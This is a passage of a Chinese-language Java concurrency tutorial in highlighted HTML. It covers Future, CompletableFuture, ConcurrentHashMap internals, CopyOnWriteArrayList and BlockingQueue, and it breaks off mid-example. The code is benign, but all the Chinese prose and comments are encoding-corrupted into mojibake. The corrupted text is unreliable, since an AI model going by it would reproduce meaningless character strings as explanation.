    V <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;
}
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºCallableä»»åŠ¡</span>
Callable&lt;String&gt; task = () -&gt; {
    Thread.sleep(<span class="hljs-number">1000</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå®Œæˆ"</span>;
};

<span class="hljs-comment">// æäº¤ä»»åŠ¡</span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
Future&lt;String&gt; future = executor.submit(task);

<span class="hljs-comment">// è·å–ç»“æœ</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> future.get(); <span class="hljs-comment">// é˜»å¡ç­‰å¾…ç»“æœ</span>
    System.out.println(result);
} <span class="hljs-keyword">catch</span> (Exception e) {
    e.printStackTrace();
}
</code></pre>
<h5 data-id="heading-72">2.4.2 Futureæ¥å£</h5>
<p><code>Future</code>æ¥å£è¡¨ç¤ºå¼‚æ­¥è®¡ç®—çš„ç»“æœï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Future</span>&lt;V&gt; {
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">cancel</span><span class="hljs-params">(<span class="hljs-type">boolean</span> mayInterruptIfRunning)</span>;  <span class="hljs-comment">// å–æ¶ˆä»»åŠ¡</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCancelled</span><span class="hljs-params">()</span>;                          <span class="hljs-comment">// æ˜¯å¦å·²å–æ¶ˆ</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDone</span><span class="hljs-params">()</span>;                               <span class="hljs-comment">// æ˜¯å¦å·²å®Œæˆ</span>
    V <span class="hljs-title function_">get</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException;  <span class="hljs-comment">// è·å–ç»“æœï¼ˆé˜»å¡ï¼‰</span>
    V <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span>              <span class="hljs-comment">// è·å–ç»“æœï¼ˆå¸¦è¶…æ—¶ï¼‰</span>
        <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException, TimeoutException;
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);

<span class="hljs-comment">// æäº¤ä»»åŠ¡</span>
Future&lt;String&gt; future = executor.submit(() -&gt; {
    Thread.sleep(<span class="hljs-number">2000</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç»“æœ"</span>;
});

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å®Œæˆ</span>
<span class="hljs-keyword">if</span> (future.isDone()) {
    System.out.println(<span class="hljs-string">"ä»»åŠ¡å·²å®Œæˆ"</span>);
}

<span class="hljs-comment">// è·å–ç»“æœï¼ˆå¸¦è¶…æ—¶ï¼‰</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> future.get(<span class="hljs-number">3</span>, TimeUnit.SECONDS);
    System.out.println(<span class="hljs-string">"ç»“æœï¼š"</span> + result);
} <span class="hljs-keyword">catch</span> (TimeoutException e) {
    System.out.println(<span class="hljs-string">"ä»»åŠ¡è¶…æ—¶"</span>);
    future.cancel(<span class="hljs-literal">true</span>); <span class="hljs-comment">// å–æ¶ˆä»»åŠ¡</span>
}
</code></pre>
<h4 data-id="heading-73">2.5 CompletableFuture</h4>
<p><code>CompletableFuture</code>æ˜¯Java 8å¼•å…¥çš„ï¼Œæä¾›äº†æ›´å¼ºå¤§çš„å¼‚æ­¥ç¼–ç¨‹èƒ½åŠ›ã€‚</p>
<h5 data-id="heading-74">2.5.1 åˆ›å»ºCompletableFuture</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨supplyAsyncï¼ˆæœ‰è¿”å›å€¼ï¼‰</span>
CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç»“æœ"</span>;
});

<span class="hljs-comment">// æ–¹å¼2ï¼šä½¿ç”¨runAsyncï¼ˆæ— è¿”å›å€¼ï¼‰</span>
CompletableFuture&lt;Void&gt; future2 = CompletableFuture.runAsync(() -&gt; {
    System.out.println(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>);
});

<span class="hljs-comment">// æ–¹å¼3ï¼šä½¿ç”¨è‡ªå®šä¹‰çº¿ç¨‹æ± </span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
CompletableFuture&lt;String&gt; future3 = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ç»“æœ"</span>;
}, executor);
</code></pre>
<h5 data-id="heading-75">2.5.2 ç»“æœå¤„ç†</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// thenApplyï¼šè½¬æ¢ç»“æœ</span>
CompletableFuture&lt;String&gt; future = CompletableFuture
    .supplyAsync(() -&gt; <span class="hljs-string">"Hello"</span>)
    .thenApply(s -&gt; s + <span class="hljs-string">" World"</span>)
    .thenApply(String::toUpperCase);

<span class="hljs-comment">// thenAcceptï¼šæ¶ˆè´¹ç»“æœï¼ˆæ— è¿”å›å€¼ï¼‰</span>
CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"Hello"</span>)
    .thenAccept(System.out::println);

<span class="hljs-comment">// thenRunï¼šæ‰§è¡Œåç»­æ“ä½œï¼ˆä¸ä¾èµ–ç»“æœï¼‰</span>
CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"Hello"</span>)
    .thenRun(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>));
</code></pre>
<h5 data-id="heading-76">2.5.3 ç»„åˆæ“ä½œ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// thenComposeï¼šç»„åˆä¸¤ä¸ªCompletableFutureï¼ˆä¸²è¡Œï¼‰</span>
CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"Hello"</span>);
CompletableFuture&lt;String&gt; future2 = future1.thenCompose(s -&gt; 
    CompletableFuture.supplyAsync(() -&gt; s + <span class="hljs-string">" World"</span>)
);

<span class="hljs-comment">// thenCombineï¼šç»„åˆä¸¤ä¸ªCompletableFutureï¼ˆå¹¶è¡Œï¼‰</span>
CompletableFuture&lt;String&gt; future1 = CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"Hello"</span>);
CompletableFuture&lt;String&gt; future2 = CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"World"</span>);
CompletableFuture&lt;String&gt; combined = future1.thenCombine(future2, (s1, s2) -&gt; s1 + <span class="hljs-string">" "</span> + s2);
</code></pre>
<h5 data-id="heading-77">2.5.4 å¼‚å¸¸å¤„ç†</h5>
<pre><code class="hljs language-java" lang="java">CompletableFuture&lt;String&gt; future = CompletableFuture
    .supplyAsync(() -&gt; {
        <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å¼‚å¸¸"</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ç»“æœ"</span>;
    })
    .exceptionally(ex -&gt; {
        System.err.println(<span class="hljs-string">"å‘ç”Ÿå¼‚å¸¸ï¼š"</span> + ex.getMessage());
        <span class="hljs-keyword">return</span> <span class="hljs-string">"é»˜è®¤å€¼"</span>;
    });

<span class="hljs-comment">// æˆ–è€…ä½¿ç”¨handleæ–¹æ³•</span>
CompletableFuture&lt;String&gt; future2 = CompletableFuture
    .supplyAsync(() -&gt; <span class="hljs-string">"ç»“æœ"</span>)
    .handle((result, ex) -&gt; {
        <span class="hljs-keyword">if</span> (ex != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"å¼‚å¸¸å¤„ç†"</span>;
        }
        <span class="hljs-keyword">return</span> result;
    });
</code></pre>
<h2 data-id="heading-78">3. å¹¶å‘é›†åˆç±»</h2>
<h4 data-id="heading-79">3.1 å¹¶å‘é›†åˆæ¦‚è¿°</h4>
<p>å¹¶å‘é›†åˆæ˜¯Javaæä¾›çš„çº¿ç¨‹å®‰å…¨çš„é›†åˆç±»ï¼Œå®ƒä»¬é€šè¿‡ä¸åŒçš„æœºåˆ¶æ¥ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæ€§èƒ½é€šå¸¸ä¼˜äºä½¿ç”¨<code>synchronized</code>åŒ…è£…çš„åŒæ­¥é›†åˆã€‚</p>
<h5 data-id="heading-80">3.1.1 å¹¶å‘é›†åˆçš„åˆ†ç±»</h5>
<ul>
<li><strong>Map</strong>ï¼š<code>ConcurrentHashMap</code></li>
<li><strong>List</strong>ï¼š<code>CopyOnWriteArrayList</code></li>
<li><strong>Set</strong>ï¼š<code>CopyOnWriteArraySet</code>ã€<code>ConcurrentSkipListSet</code></li>
<li><strong>Queue</strong>ï¼š<code>ConcurrentLinkedQueue</code>ã€å„ç§<code>BlockingQueue</code></li>
<li><strong>å…¶ä»–</strong>ï¼š<code>ConcurrentSkipListMap</code></li>
</ul>
<h5 data-id="heading-81">3.1.2 å¹¶å‘é›†åˆ vs åŒæ­¥é›†åˆ</h5>
<p><strong>åŒæ­¥é›†åˆï¼ˆä¸æ¨èï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨Collections.synchronizedMapåŒ…è£…</span>
Map&lt;String, String&gt; map = Collections.synchronizedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());
<span class="hljs-comment">// é—®é¢˜ï¼šæ€§èƒ½å·®ï¼Œé”ç²’åº¦å¤§</span>
</code></pre>
<p><strong>å¹¶å‘é›†åˆï¼ˆæ¨èï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ConcurrentHashMap</span>
Map&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
<span class="hljs-comment">// ä¼˜ç‚¹ï¼šæ€§èƒ½å¥½ï¼Œé”ç²’åº¦å°</span>
</code></pre>
<h4 data-id="heading-82">3.2 ConcurrentHashMap</h4>
<p><code>ConcurrentHashMap</code>æ˜¯çº¿ç¨‹å®‰å…¨çš„HashMapå®ç°ï¼Œåœ¨JDK 1.8ä¸­è¿›è¡Œäº†é‡å¤§ä¼˜åŒ–ã€‚</p>
<h5 data-id="heading-83">3.2.1 JDK 1.8å®ç°åŸç†</h5>
<p>JDK 1.8çš„<code>ConcurrentHashMap</code>ä½¿ç”¨<strong>CAS + synchronized</strong>æ¥å®ç°çº¿ç¨‹å®‰å…¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åŸºæœ¬ç»“æ„</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;K,V&gt; {
    <span class="hljs-comment">// æ•°ç»„ï¼ˆæ¡¶æ•°ç»„ï¼‰</span>
    <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node&lt;K,V&gt;[] table;
    
    <span class="hljs-comment">// èŠ‚ç‚¹ç»“æ„</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry&lt;K,V&gt; {
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> hash;
        <span class="hljs-keyword">final</span> K key;
        <span class="hljs-keyword">volatile</span> V val;
        <span class="hljs-keyword">volatile</span> Node&lt;K,V&gt; next;
    }
}
</code></pre>
<p><strong>æ ¸å¿ƒæœºåˆ¶ï¼š</strong></p>
<ol>
<li><strong>CASæ“ä½œ</strong>ï¼šç”¨äºæ— é”çš„æ’å…¥å’Œæ›´æ–°</li>
<li><strong>synchronizedé”</strong>ï¼šç”¨äºé“¾è¡¨å¤´èŠ‚ç‚¹ï¼Œé”ç²’åº¦å°</li>
<li><strong>åˆ†æ®µé”æ€æƒ³</strong>ï¼šæ¯ä¸ªæ¡¶ï¼ˆæ•°ç»„å…ƒç´ ï¼‰å¯ä»¥ç‹¬ç«‹åŠ é”</li>
</ol>
<h5 data-id="heading-84">3.2.2 put()æ–¹æ³•å®ç°</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> {
    <span class="hljs-keyword">return</span> putVal(key, value, <span class="hljs-literal">false</span>);
}

<span class="hljs-keyword">final</span> V <span class="hljs-title function_">putVal</span><span class="hljs-params">(K key, V value, <span class="hljs-type">boolean</span> onlyIfAbsent)</span> {
    <span class="hljs-comment">// 1. è®¡ç®—hashå€¼</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> spread(key.hashCode());
    
    <span class="hljs-comment">// 2. éå†é“¾è¡¨</span>
    <span class="hljs-keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) {
        Node&lt;K,V&gt; f; <span class="hljs-type">int</span> n, i, fh;
        
        <span class="hljs-comment">// 3. å¦‚æœè¡¨ä¸ºç©ºï¼Œåˆå§‹åŒ–</span>
        <span class="hljs-keyword">if</span> (tab == <span class="hljs-literal">null</span> || (n = tab.length) == <span class="hljs-number">0</span>)
            tab = initTable();
        
        <span class="hljs-comment">// 4. å¦‚æœæ¡¶ä¸ºç©ºï¼Œä½¿ç”¨CASæ’å…¥</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((f = tabAt(tab, i = (n - <span class="hljs-number">1</span>) &amp; hash)) == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (casTabAt(tab, i, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;K,V&gt;(hash, key, value, <span class="hljs-literal">null</span>)))
                <span class="hljs-keyword">break</span>;
        }
        
        <span class="hljs-comment">// 5. å¦‚æœæ­£åœ¨æ‰©å®¹ï¼Œå¸®åŠ©æ‰©å®¹</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((fh = f.hash) == MOVED)
            tab = helpTransfer(tab, f);
        
        <span class="hljs-comment">// 6. å¦åˆ™ï¼Œä½¿ç”¨synchronizedé”ä½é“¾è¡¨å¤´èŠ‚ç‚¹</span>
        <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">synchronized</span> (f) {
                <span class="hljs-comment">// åœ¨é“¾è¡¨ä¸­æŸ¥æ‰¾æˆ–æ’å…¥</span>
            }
        }
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨CASè¿›è¡Œæ— é”æ’å…¥ï¼ˆæ¡¶ä¸ºç©ºæ—¶ï¼‰</li>
<li>ä½¿ç”¨synchronizedé”ä½é“¾è¡¨å¤´èŠ‚ç‚¹ï¼ˆæ¡¶ä¸ä¸ºç©ºæ—¶ï¼‰</li>
<li>é”ç²’åº¦å°ï¼Œåªé”ä¸€ä¸ªæ¡¶ï¼Œä¸å½±å“å…¶ä»–æ¡¶çš„æ“ä½œ</li>
</ul>
<h5 data-id="heading-85">3.2.3 get()æ–¹æ³•å®ç°</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> {
    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class="hljs-type">int</span> n, eh; K ek;
    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> spread(key.hashCode());
    
    <span class="hljs-comment">// 1. å¦‚æœè¡¨ä¸ä¸ºç©ºä¸”æ¡¶ä¸ä¸ºç©º</span>
    <span class="hljs-keyword">if</span> ((tab = table) != <span class="hljs-literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="hljs-number">0</span> &amp;&amp;
        (e = tabAt(tab, (n - <span class="hljs-number">1</span>) &amp; h)) != <span class="hljs-literal">null</span>) {
        
        <span class="hljs-comment">// 2. å¦‚æœç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯è¦æ‰¾çš„èŠ‚ç‚¹</span>
        <span class="hljs-keyword">if</span> ((eh = e.hash) == h) {
            <span class="hljs-keyword">if</span> ((ek = e.key) == key || (ek != <span class="hljs-literal">null</span> &amp;&amp; key.equals(ek)))
                <span class="hljs-keyword">return</span> e.val;
        }
        
        <span class="hljs-comment">// 3. å¦‚æœhashå€¼ä¸ºè´Ÿæ•°ï¼Œå¯èƒ½æ˜¯çº¢é»‘æ ‘æˆ–æ­£åœ¨æ‰©å®¹</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (eh &lt; <span class="hljs-number">0</span>)
            <span class="hljs-keyword">return</span> (p = e.find(h, key)) != <span class="hljs-literal">null</span> ? p.val : <span class="hljs-literal">null</span>;
        
        <span class="hljs-comment">// 4. éå†é“¾è¡¨</span>
        <span class="hljs-keyword">while</span> ((e = e.next) != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (e.hash == h &amp;&amp;
                ((ek = e.key) == key || (ek != <span class="hljs-literal">null</span> &amp;&amp; key.equals(ek))))
                <span class="hljs-keyword">return</span> e.val;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ— é”è¯»å–</strong>ï¼šgetæ“ä½œä¸éœ€è¦åŠ é”ï¼Œé€šè¿‡volatileä¿è¯å¯è§æ€§</li>
<li><strong>æ€§èƒ½é«˜</strong>ï¼šè¯»æ“ä½œä¸ä¼šé˜»å¡å†™æ“ä½œ</li>
</ul>
<h5 data-id="heading-86">3.2.4 size()æ–¹æ³•å®ç°</h5>
<p><code>ConcurrentHashMap</code>çš„<code>size()</code>æ–¹æ³•ä¸æ˜¯ç®€å•åœ°è¿”å›ä¸€ä¸ªå˜é‡ï¼Œè€Œæ˜¯é€šè¿‡ç´¯åŠ å„ä¸ªæ®µçš„å¤§å°æ¥è®¡ç®—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> {
    <span class="hljs-type">long</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> sumCount();
    <span class="hljs-keyword">return</span> ((n &lt; <span class="hljs-number">0L</span>) ? <span class="hljs-number">0</span> :
            (n &gt; (<span class="hljs-type">long</span>)Integer.MAX_VALUE) ? Integer.MAX_VALUE :
            (<span class="hljs-type">int</span>)n);
}

<span class="hljs-comment">// ç´¯åŠ æ‰€æœ‰CounterCellçš„å€¼</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-title function_">sumCount</span><span class="hljs-params">()</span> {
    CounterCell[] as = counterCells; CounterCell a;
    <span class="hljs-type">long</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> baseCount;
    <span class="hljs-keyword">if</span> (as != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; as.length; ++i) {
            <span class="hljs-keyword">if</span> ((a = as[i]) != <span class="hljs-literal">null</span>)
                sum += a.value;
        }
    }
    <span class="hljs-keyword">return</span> sum;
}
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> <code>size()</code>æ–¹æ³•è¿”å›çš„æ˜¯è¿‘ä¼¼å€¼ï¼Œå› ä¸ºå¹¶å‘ç¯å¢ƒä¸‹ï¼Œå¤§å°å¯èƒ½éšæ—¶å˜åŒ–ã€‚</p>
<h4 data-id="heading-87">3.3 CopyOnWriteArrayList</h4>
<p><code>CopyOnWriteArrayList</code>æ˜¯çº¿ç¨‹å®‰å…¨çš„ArrayListå®ç°ï¼Œé‡‡ç”¨<strong>å†™æ—¶å¤åˆ¶</strong>æœºåˆ¶ã€‚</p>
<h5 data-id="heading-88">3.3.1 å†™æ—¶å¤åˆ¶æœºåˆ¶</h5>
<p><strong>åŸç†ï¼š</strong></p>
<ul>
<li><strong>è¯»æ“ä½œ</strong>ï¼šç›´æ¥è¯»å–ï¼Œä¸éœ€è¦åŠ é”</li>
<li><strong>å†™æ“ä½œ</strong>ï¼šå…ˆå¤åˆ¶æ•´ä¸ªæ•°ç»„ï¼Œåœ¨å‰¯æœ¬ä¸Šä¿®æ”¹ï¼Œç„¶åæ›¿æ¢åŸæ•°ç»„</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;E&gt; {
    <span class="hljs-comment">// åº•å±‚æ•°ç»„ï¼Œä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Object[] array;
    
    <span class="hljs-comment">// å†™æ“ä½œï¼šå¤åˆ¶æ•°ç»„</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> {
        <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.lock;
        lock.lock();
        <span class="hljs-keyword">try</span> {
            Object[] elements = getArray();
            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> elements.length;
            <span class="hljs-comment">// å¤åˆ¶æ•°ç»„</span>
            Object[] newElements = Arrays.copyOf(elements, len + <span class="hljs-number">1</span>);
            newElements[len] = e;
            <span class="hljs-comment">// æ›¿æ¢åŸæ•°ç»„</span>
            setArray(newElements);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">// è¯»æ“ä½œï¼šç›´æ¥è¯»å–ï¼Œä¸éœ€è¦åŠ é”</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> {
        <span class="hljs-keyword">return</span> get(getArray(), index);
    }
}
</code></pre>
<h5 data-id="heading-89">3.3.2 é€‚ç”¨åœºæ™¯</h5>
<p><strong>é€‚åˆï¼š</strong></p>
<ul>
<li>è¯»å¤šå†™å°‘çš„åœºæ™¯</li>
<li>å¯¹æ•°æ®ä¸€è‡´æ€§è¦æ±‚ä¸é«˜çš„åœºæ™¯</li>
</ul>
<p><strong>ä¸é€‚åˆï¼š</strong></p>
<ul>
<li>å†™æ“ä½œé¢‘ç¹çš„åœºæ™¯ï¼ˆæ¯æ¬¡å†™éƒ½è¦å¤åˆ¶æ•°ç»„ï¼Œå¼€é”€å¤§ï¼‰</li>
<li>å¯¹å®æ—¶æ€§è¦æ±‚é«˜çš„åœºæ™¯ï¼ˆå†™æ“ä½œå¯èƒ½è¯»å–åˆ°æ—§æ•°æ®ï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€‚åˆåœºæ™¯ï¼šç›‘å¬å™¨åˆ—è¡¨ï¼ˆè¯»å¤šå†™å°‘ï¼‰</span>
CopyOnWriteArrayList&lt;Listener&gt; listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();

<span class="hljs-comment">// æ·»åŠ ç›‘å¬å™¨ï¼ˆå†™æ“ä½œå°‘ï¼‰</span>
listeners.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Listener</span>());

<span class="hljs-comment">// éå†ç›‘å¬å™¨ï¼ˆè¯»æ“ä½œå¤šï¼‰</span>
<span class="hljs-keyword">for</span> (Listener listener : listeners) {
    listener.onEvent();
}
</code></pre>
<h4 data-id="heading-90">3.4 BlockingQueueè¯¦è§£</h4>
<p><code>BlockingQueue</code>æ˜¯é˜»å¡é˜Ÿåˆ—æ¥å£ï¼Œæä¾›äº†çº¿ç¨‹å®‰å…¨çš„é˜Ÿåˆ—æ“ä½œã€‚</p>
<h5 data-id="heading-91">3.4.1 é˜»å¡æ–¹æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BlockingQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Queue</span>&lt;E&gt; {
    <span class="hljs-comment">// é˜»å¡æ’å…¥ï¼šå¦‚æœé˜Ÿåˆ—æ»¡ï¼Œåˆ™é˜»å¡ç­‰å¾…</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(E e)</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">// é˜»å¡ç§»é™¤ï¼šå¦‚æœé˜Ÿåˆ—ç©ºï¼Œåˆ™é˜»å¡ç­‰å¾…</span>
    E <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;
}
</code></pre>
<h5 data-id="heading-92">3.4.2 éé˜»å¡æ–¹æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éé˜»å¡æ’å…¥ï¼šå¦‚æœé˜Ÿåˆ—æ»¡ï¼Œè¿”å›false</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E e)</span>;

<span class="hljs-comment">// éé˜»å¡ç§»é™¤ï¼šå¦‚æœé˜Ÿåˆ—ç©ºï¼Œè¿”å›null</span>
E <span class="hljs-title function_">poll</span><span class="hljs-params">()</span>;
</code></pre>
<h5 data-id="heading-93">3.4.3 è¶…æ—¶æ–¹æ³•</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¶…æ—¶æ’å…¥ï¼šå¦‚æœé˜Ÿåˆ—æ»¡ï¼Œç­‰å¾…æŒ‡å®šæ—¶é—´</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E e, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;

<span class="hljs-comment">// è¶…æ—¶ç§»é™¤ï¼šå¦‚æœé˜Ÿåˆ—ç©ºï¼Œç­‰å¾…æŒ‡å®šæ—¶é—´</span>
E <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;
</code></pre>
<h5 data-id="heading-94">3.4.4 å„ç§BlockingQueueå®ç°</h5>
<p><strong>1. ArrayBlockingQueue</strong></p>
<p>åŸºäºæ•°ç»„çš„æœ‰ç•Œé˜»å¡é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå®¹é‡ä¸º10çš„é˜»å¡é˜Ÿåˆ—</span>
BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>);

<span class="hljs-comment">// ç”Ÿäº§è€…</span>
queue.put(<span class="hljs-string">"æ•°æ®"</span>);

<span class="hljs-comment">// æ¶ˆè´¹è€…</span>
<span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> queue.take();
</code></pre>
<p><strong>2. LinkedBlockingQueue</strong></p>
<p>åŸºäºé“¾è¡¨çš„æœ‰ç•Œæˆ–æ— ç•Œé˜»å¡é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—</span>
BlockingQueue&lt;String&gt; queue1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>);

<span class="hljs-comment">// æ— ç•Œé˜Ÿåˆ—</span>
BlockingQueue&lt;String&gt; queue2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
</code></pre>
<p><strong>3. PriorityBlockingQueue</strong></p>
<p>å…·æœ‰ä¼˜å…ˆçº§çš„æ— ç•Œé˜»å¡é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºä¼˜å…ˆçº§é˜Ÿåˆ—</span>
